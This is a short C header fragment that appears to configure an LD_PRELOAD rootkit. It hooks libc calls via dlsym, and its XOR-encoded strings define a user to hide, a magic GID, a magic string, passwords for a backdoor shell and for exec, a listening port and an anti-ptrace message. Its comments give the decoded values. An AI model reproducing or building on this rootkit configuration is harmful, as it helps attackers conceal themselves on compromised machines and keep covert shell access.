#ifndef RTLD_NEXT
#define RTLD_NEXT ((void *) -11) 
#endif
#define HOOK(func) old##_##func = dlsym(RTLD_NEXT, #func)
#define CLEAN(var) clean(var, strlen(var))
#define USER "\x42\x43\x4e\x4f\x47\x4f" // hideme
#define PROC_PATH "\x5\x5a\x58\x45\x49\x5\x59\x4f\x46\x4c\x5\x4c\x4e\x5\xf\x4e"
#define LIBC "/lib/libc.so.6"
#define MAGIC "\x47\x45\x59\x42\x43" // moshi
#define PROC "\x5\x5a\x58\x45\x49" // /proc 
#define MAGICGID 1337
#define EXECPW "\x43\x44\x59\x5e\x4b\x46\x46\x4d\x4f\x44\x5e\x45\x45" // installgentoo
#define SHELLPW "\x48\x46\x1b\x44\x4d" // bl1ng
#define DEFAULT_PORT	1337
#define IP		"127.0.0.1"
#define PTRACE_MSG "\x49\x45\x5d\x59\x4b\x53\x10\xa\x8\x5f\x58\xa\x5a\x5d\x44\x4f\x4e\xa\x46\x45\x46\x8" //

